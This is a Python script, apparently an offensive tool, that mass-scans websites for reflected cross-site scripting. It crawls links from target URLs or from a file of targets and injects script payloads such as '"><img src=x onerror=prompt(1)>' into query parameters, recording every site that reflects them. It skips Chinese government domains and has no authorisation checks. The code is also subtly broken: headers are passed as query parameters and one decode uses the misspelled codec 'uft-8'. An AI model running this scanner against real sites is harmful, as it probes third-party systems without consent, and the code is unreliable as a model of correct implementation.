#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor,as_completed
import time

print(r'''
 _____ _____   ___   _   _                
/  ___/  __ \ / _ \ | \ | |               
\ `--.| /  \// /_\ \|  \| | __  _____ ___ 
 `--. \ |    |  _  || . ` | \ \/ / __/ __|
/\__/ / \__/\| | | || |\  |  >  <\__ \__ \
\____/ \____/\_| |_/\_| \_/ /_/\_\___/___/
                        ______            
                       |______|           
''')
lock = threading.Lock()

num=0
headers = {

            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
}

payload_sz= ['</script>"><script>prompt(1)</script>', '</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>', '"><img src=x onerror=prompt(1)>']

def piliang(url):
	url=url.rstrip("\n")
	url=url if '://' in url else 'http://'+url
	url=url+'/'
	getlink(url)

def getlink(url):
	SZ=[]
	try:
		req = requests.get(url, headers, verify=False, timeout=10)
		zzwb=r'href.?=("|\')([#\?\w\-_&=\./:]{1,}[\?=]{1,}[#\?\w\-_&=\./:\u4e00-\u9fa5]{1,})("|\')'
		html = req.content.decode('gbk','replace')
		res=re.findall(zzwb,html)
		if len(res) == 0:
			html = req.content.decode('uft-8','replace')
			res=re.findall(zzwb,html)
		for link_ in res:
			link_=link_[1]
			link=link_ if 'http' in link_ else url+link_
			if '.gov.cn' in link:
				continue
			zzwb2=r'([#\w\-_\./:\u4e00-\u9fa5]{1,}=)[#\?\w\-_\./:\u4e00-\u9fa5]{1,}'
			try:

				res2=re.finditer(zzwb2,link,re.M)

				for canshu in res2:

					link=link.replace(canshu.group(0),canshu.group(1)+'xss_payload')


				pass
			except Exception as e:
				raise(e)
			SZ.append(link)
	

		pass
	except Exception as e:
		raise(e)
	SZ=list(set(SZ))
	print('【url】{}【link_num】'.format(url)+str(len(SZ)))
	if len(SZ)!=0:
		scan_xss(SZ)

def scan_xss(list):
	
	for link in list:
		link_=link
		xunhuan=0	
		for payload in payload_sz:
			link=link_.replace('xss_payload',payload)

			print('[testing]:'+link)
			try:
				req = requests.get(link, headers, verify=False, timeout=10)
				html = req.content.decode('utf-8','replace')
				if payload in html:
					global num
					num=num+1
					xunhuan=1
					print(2222)


					print('success:'+link)
					lock.acquire()
					with open("vulurl_xss.txt","a") as f:
						f.writelines(link+"\r\n")
					lock.release()
					if req.status_code != 200 or xunhuan==1:
							#pass
							break
                    	#res.status_code i= 200:
                    		#break
                    	#	pass

			except Exception as e:
				raise e
			if xunhuan==1:
				break
		

class MyThreadPool():
    def __init__(self, my_func,my_list,thread_num):
        self.my_func = my_func
        self.my_list = my_list
        self.thread_num = thread_num

    def start(self):
        with ThreadPoolExecutor(max_workers=self.thread_num) as executor:
            all_task = [executor.submit(self.my_func, (test)) for test in self.my_list]
            for future in as_completed(all_task):
                pass

def main():
	last_time = time.time()

	if len(sys.argv)<3:
		print('error:python3 -u 127.0.0.1 or python3 -r 1.txt 10')
		sys.exit(0)
	if sys.argv[1]=='-u':
		url=sys.argv[2] if '://' in sys.argv[2] else 'http://'+sys.argv[2]
		url=url+'/'
		getlink (url)
	elif sys.argv[1]=='-r':
		f = open(sys.argv[2],'r')
		a = list(f)
		#print(a)
		f.close()
		if len(a)!=0:
			myThreadPool = MyThreadPool(piliang,a,int(sys.argv[3]))
			myThreadPool.start()
		pass
	else:
		print('error:python3 -u 127.0.0.1 or python3 -r 1.txt 10')	
	print('扫描完成,存在漏洞数量:'+str(num)+'用时'+str(time.time() - last_time))

	#print(SZ)
if __name__ == '__main__':
	main()
  
